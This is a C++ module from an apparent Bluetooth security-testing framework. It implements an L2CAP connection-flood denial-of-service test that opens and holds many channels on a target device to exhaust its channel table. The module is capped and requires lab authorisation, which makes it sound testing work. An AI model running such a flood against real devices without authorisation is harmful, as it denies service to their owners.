#include "core/bt.h"
#include "core/config.h"
#include "core/module.h"

#include <sstream>

namespace {
using namespace blueboy;

/// Holds many simultaneous L2CAP connections to exhaust the peer's channel
/// table (the "connection exhaustion" availability test).
class L2capFlood : public Module {
public:
  std::string name() const override { return "l2cap_flood"; }
  std::string category() const override { return "offensive"; }
  std::string description() const override {
    return "Connection exhaustion: open many L2CAP channels and hold them";
  }
  std::string requirements() const override {
    return "root or CAP_NET_RAW, lab authorisation";
  }
  bool offensive() const override { return true; }
  std::string impact() const override {
    return "Holds up to 64 L2CAP channels for a few seconds. Peers with small "
           "channel tables may refuse new connections until the links time out.";
  }

  ModuleResult run(const ModuleContext &ctx) override {
    ModuleResult r;
    const int psm = ctx.config->get_int("dos", "flood_psm", 0x0001);
    const int wanted = ctx.config->get_int("dos", "connections", 16);
    const int hold = ctx.config->get_int("dos", "hold_seconds", 3);

    const int opened =
        bt::l2cap_connect_burst(ctx.target, static_cast<uint16_t>(psm), wanted,
                                hold);

    std::ostringstream summary;
    summary << "Opened " << opened << "/" << wanted << " L2CAP connection(s) on PSM 0x"
            << std::hex << psm;
    r.summary = summary.str();
    r.success = opened > 0;

    r.add("Held the channels for " + std::to_string(hold) + " s, then closed all");
    r.add("Connections are closed by the module; no state is left on our side");
    r.add("Cap: 64 simultaneous channels, 10 s hold (enforced in bt.cpp)");

    if (opened == 0)
      r.advise("PSM may be closed or the peer is unreachable; try the PSM that "
               "SDP advertised for the target service");
    if (opened > 0 && opened < wanted)
      r.add("Peer refused part of the burst: channel table pressure observed");
    r.advise("Document the refused-connection count; it is the measurable "
             "impact of this test");
    r.advise("Check that the peer recovers every service after the run");
    return r;
  }
};

REGISTER_MODULE(L2capFlood);
} // namespace
